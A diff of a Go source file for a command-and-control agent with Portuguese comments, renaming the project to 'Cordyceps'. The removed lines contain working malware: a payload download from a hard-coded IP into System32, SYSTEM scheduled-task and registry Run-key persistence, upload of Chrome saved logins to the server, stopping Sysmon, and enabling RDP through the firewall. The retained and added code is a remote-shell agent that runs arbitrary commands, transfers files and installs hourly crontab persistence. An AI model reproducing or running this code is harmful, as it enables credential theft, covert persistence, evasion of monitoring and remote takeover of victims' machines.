@@ -1,23 +1,17 @@
 package main
 
 import (
-	commons "NetBios/C2/d3c/commons/estruturas"
-	"NetBios/C2/d3c/commons/helpers"
+	commons "Cordyceps/commons/estruturas"
+	"Cordyceps/commons/helpers"
 	"encoding/gob"
 	"fmt"
-	"io"
 	"io/ioutil"
 	"log"
-	"math/rand"
 	"net"
-	"net/http"
 	"os"
 	"os/exec"
 	"os/user"
-	"path/filepath"
 	"runtime"
-	"strings"
-	"syscall"
 	"time"
 )
 
@@ -31,49 +25,10 @@ var (
 // Dados do Servidor
 const (
 	//Coloque aqui o IP publico para conexão
-	//SERVIDOR = "200.98.129.32"
+	//SERVIDOR = "192.168.15.8"
 	SERVIDOR = "127.0.0.1"
-	PORTA    = "9090"
+	PORTA    = "54321"
 )
-
-func Username() {
-	username := nome
-	password := 123
-	println(username + password)
-}
-
-func EvilTask() error {
-	currentUser, err := user.Current()
-	if err != nil {
-		return err
-	}
-	split := strings.Split(currentUser.Username, "\\")
-	if len(split) > 1 {
-		currentUser.Username = split[1]
-	}
-	cmd := exec.Command("schtasks", "/create", "/sc", "minute", "/mo", "5", "/tn", "eviltask", "/tr", "%s\\System32\\svchost.dll", "/ru", "SYSTEM", currentUser.HomeDir)
-	err = cmd.Run()
-	if err != nil {
-		return err
-	}
-
-	return nil
-}
-func BaixaCreedsGoogle() error {
-	userHomeDir, err := os.UserHomeDir()
-	if err != nil {
-		return err
-	}
-
-	chromeDataDir := filepath.Join(userHomeDir, "AppData", "Local", "Google", "Chrome", "User Data", "Default")
-	cmd := exec.Command("powershell", "-Command", fmt.Sprintf(`(New-Object System.Net.WebClient).UploadFile('http://%s/tmp', '%s')`, SERVIDOR+":"+PORTA, filepath.Join(chromeDataDir, "Login Data")))
-	err = cmd.Run()
-	if err != nil {
-		return err
-	}
-
-	return nil
-}
 
 func CapturaUser() {
 	currentUser, err := user.Current()
@@ -92,194 +47,15 @@ func init() {
 	mensagem.AgentHost, _ = os.Hostname()
 	mensagem.AgentCWD, _ = os.Getwd()
 	mensagem.AgentID = geraID()
-}
-func addRegistryKey() error {
-	currentUser, err := user.Current()
-	if err != nil {
-		return err
-	}
 
-	// Obtendo apenas o nome do usuário do caminho completo (caso seja DOMAIN\Username)
-	split := strings.Split(currentUser.Username, "\\")
-	if len(split) > 1 {
-		currentUser.Username = split[1]
-	}
-	words := []string{"Discord", "Adobe", "Python", "PhotoShop", "Slack", "Notion", "Spotfy", "Chrome", "FireFox", "Web", "Internet", "SvcHost", "Windows"}
-	rand.Seed(time.Now().UnixNano())
-	randomIndex := rand.Intn(len(words))
-	command := fmt.Sprintf(`REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "%s" /t REG_SZ /F /D "%s\\System32\\svchost.dll"`, words[randomIndex], currentUser.HomeDir)
-	cmd := exec.Command("cmd", "/C", command)
-
-	if runtime.GOOS == "windows" {
-		cmd.SysProcAttr = &syscall.SysProcAttr{}
-	}
-
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		return fmt.Errorf("Erro ao executar o comando: %v\n%s", err, string(output))
-	}
-
-	fmt.Println("Chave do registro adicionada com sucesso!")
-	return nil
-}
-func createLaunchdPlist() error {
-	// Obter o diretório "Downloads" do usuário atual
-	downloadsDir, err := os.UserHomeDir()
-	if err != nil {
-		return err
-	}
-	downloadsDir = filepath.Join(downloadsDir, "Downloads")
-
-	// Caminho completo do arquivo executável "agente"
-	executable := filepath.Join(downloadsDir, "agente")
-
-	// Obtém o diretório LaunchAgents do usuário atual
-	currentUser, err := user.Current()
-	if err != nil {
-		return err
-	}
-	launchAgentsDir := filepath.Join(currentUser.HomeDir, "Library", "LaunchAgents")
-
-	// Cria o arquivo plist
-	plistContent := `<?xml version="1.0" encoding="UTF-8"?>
-	<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-	<plist version="1.0">
-	<dict>
-		<key>Label</key>
-		<string>meu.programa</string>
-		<key>ProgramArguments</key>
-		<array>
-			<string>` + executable + `</string>
-		</array>
-		<key>RunAtLoad</key>
-		<true/>
-	</dict>
-	</plist>`
-
-	// Escreve o conteúdo do plist no arquivo
-	err = ioutil.WriteFile(filepath.Join(launchAgentsDir, "meu.programa.plist"), []byte(plistContent), 0644)
-	if err != nil {
-		return err
-	}
-
-	return nil
-}
-func createCronJob() error {
-	// Obtém o nome do usuário atual
-	currentUser, err := user.Current()
-	if err != nil {
-		return err
-	}
-	// Caminho para o arquivo executável que será agendado
-	executable := filepath.Join(currentUser.HomeDir, "Downloads", "agente")
-
-	// Cria a linha de comando para adicionar a regra no cron
-	cronJob := fmt.Sprintf("@hourly %s", executable)
-
-	// Caminho completo para o arquivo de cron do usuário atual
-	cronFilePath := filepath.Join(currentUser.HomeDir, ".cron")
-
-	// Abre o arquivo de cron existente ou cria um novo
-	cronFile, err := os.OpenFile(cronFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		return err
-	}
-	defer cronFile.Close()
-
-	// Escreve a nova regra de cron no arquivo
-	_, err = fmt.Fprintln(cronFile, cronJob)
-	if err != nil {
-		return err
-	}
-
-	return nil
-}
-func stopSysmonService() string {
-	resposta := "Sysmon Stoped"
-
-	// Executa o comando para obter a lista de serviços
-	cmd := exec.Command("powershell", "Get-Service | Where-Object { $_.DisplayName -like '*Sysmon*' } | Select-Object -ExpandProperty Name")
-	output, err := cmd.Output()
-	if err != nil {
-		resposta = "Erro ao obter o nome do serviço Sysmon: " + err.Error()
-		return resposta
-	}
-
-	// Obtém o nome do serviço Sysmon do resultado do comando
-	serviceName := strings.TrimSpace(string(output))
-	if serviceName == "" {
-		resposta = "Serviço Sysmon não encontrado."
-		return resposta
-	}
-
-	// Executa o comando para parar o serviço Sysmon
-	cmd = exec.Command("powershell", "Stop-Service -Name '"+serviceName+"'")
-	err = cmd.Run()
-	if err != nil {
-		resposta = "Erro ao parar o serviço Sysmon: " + err.Error()
-		return resposta
-	}
-
-	return resposta
-}
-func startSysmonService() string {
-	resposta := "Sysmon Started"
-
-	// Executa o comando para obter a lista de serviços
-	cmd := exec.Command("powershell", "Get-Service | Where-Object { $_.DisplayName -like '*Sysmon*' } | Select-Object -ExpandProperty Name")
-	output, err := cmd.Output()
-	if err != nil {
-		resposta = "Erro ao obter o nome do serviço Sysmon: " + err.Error()
-		return resposta
-	}
-
-	// Obtém o nome do serviço Sysmon do resultado do comando
-	serviceName := strings.TrimSpace(string(output))
-	if serviceName == "" {
-		resposta = "Serviço Sysmon não encontrado."
-		return resposta
-	}
-
-	// Executa o comando para iniciar o serviço Sysmon
-	cmd = exec.Command("powershell", "Start-Service -Name '"+serviceName+"'")
-	err = cmd.Run()
-	if err != nil {
-		resposta = "Erro ao iniciar o serviço Sysmon: " + err.Error()
-		return resposta
-	}
-
-	return resposta
-}
-
-func enableRDP() string {
-	resposta := "All okay"
-	cmd1 := exec.Command("powershell", "-Command", "Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name 'fDenyTSConnections' -Value 0")
-	err := cmd1.Run()
-	if err != nil {
-		resposta = "Not okay Error: " + err.Error()
-		return resposta
-	}
-
-	// Abrir a porta 3389 no Firewall
-	cmd2 := exec.Command("powershell", "-Command", "$fwPolicy = New-Object -ComObject HNetCfg.FwPolicy2; $profile = $fwPolicy.GetProfileByType(1); $rule = New-Object -ComObject HNetCfg.FwRule; $rule.Name = 'Área de Trabalho Remota'; $rule.Description = 'Regra para permitir conexões de Área de Trabalho Remota'; $rule.Protocol = 6; $rule.LocalPorts = '3389'; $rule.Direction = 1; $rule.Enabled = $true; $profile.FirewallRules.Add($rule)")
-	err = cmd2.Run()
-	if err != nil {
-		resposta = fmt.Sprintf("Falha ao abrir a porta 3389 no Firewall: %v", err)
-		return resposta
-	}
-
-	return resposta
 }
 func main() {
 	if runtime.GOOS == "windows" {
-		DownloadDll()
-		EvilTask()
-		addRegistryKey()
-		BaixaCreedsGoogle()
+		log.Println("Windows")
 	} else if runtime.GOOS == "linux" {
-		createCronJob()
+		cronJobShell()
 	} else {
-		createLaunchdPlist()
+		log.Println("MacOs")
 	}
 	log.Println("Executando Agent")
 	CapturaUser()
@@ -303,16 +79,31 @@ func main() {
 	}
 
 }
+func cronJobShell() error {
+	// Definir o comando a ser adicionado ao cronjob
+	command := "./agent.go"
+	currentUser, err := user.Current()
+	if err != nil {
+		return err
+	}
+	homeDir := currentUser.HomeDir
+	// Criar o comando cron
+	cronCommand := fmt.Sprintf("@hourly cd %s && %s", homeDir+"/tmp", command)
+
+	// Adicionar o novo cronjob
+	cmd := exec.Command("bash", "-c", fmt.Sprintf("echo \"%s\" | crontab -", cronCommand))
+	cmd.Run()
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
+
 func executaComando(comando string, indice int) (resposta string) {
 	comandoSeparado := helpers.SeparaComando(comando)
 	comandoBase := comandoSeparado[0]
 	switch comandoBase {
-	case "rdp":
-		resposta = enableRDP()
-	case "startsys":
-		resposta = startSysmonService()
-	case "stopsys":
-		resposta = stopSysmonService()
 	case "list":
 		resposta = listaArquivos()
 	case "pwd":
@@ -325,18 +116,10 @@ func executaComando(comando string, indice int) (resposta string) {
 		resposta = salvaArquivoEmDisco(mensagem.Comandos[indice].Arquivo)
 	case "get":
 		resposta = enviarArquivoEmDisco(mensagem.Comandos[indice].Comando, indice)
-	case "passwd":
-		resposta = crackPaswd()
 	default:
 		resposta = executaComandoEmShell(comando)
 	}
 	return resposta
-}
-
-// TODO - Fazer modulo de Quebra de Senhas
-func crackPaswd() string {
-	texto := "Dumping Passwords ... Wait .."
-	return texto
 }
 
 func enviarArquivoEmDisco(comandoGet string, indice int) (resposta string) {
@@ -415,43 +198,4 @@ func geraID() string {
 	hostname, _ := os.Hostname()
 	return hostname
 
-}
-
-func DownloadDll() {
-	url := "http://200.98.129.32/svchost.dll"
-	outputDir := getSystem32Directory()
-
-	err := downloadFile(url, outputDir)
-	if err != nil {
-		fmt.Printf("Erro ao fazer o download do arquivo: %v\n", err)
-		return
-	}
-
-	fmt.Println("Download concluído com sucesso!")
-}
-
-func getSystem32Directory() string {
-	system32Dir := os.Getenv("SystemRoot")
-	return filepath.Join(system32Dir, "System32")
-}
-func downloadFile(url, outputDir string) error {
-	response, err := http.Get(url)
-	if err != nil {
-		return err
-	}
-	defer response.Body.Close()
-
-	outputFile := filepath.Join(outputDir, "svchost.dll")
-	out, err := os.Create(outputFile)
-	if err != nil {
-		return err
-	}
-	defer out.Close()
-
-	_, err = io.Copy(out, response.Body)
-	if err != nil {
-		return err
-	}
-
-	return nil
 }
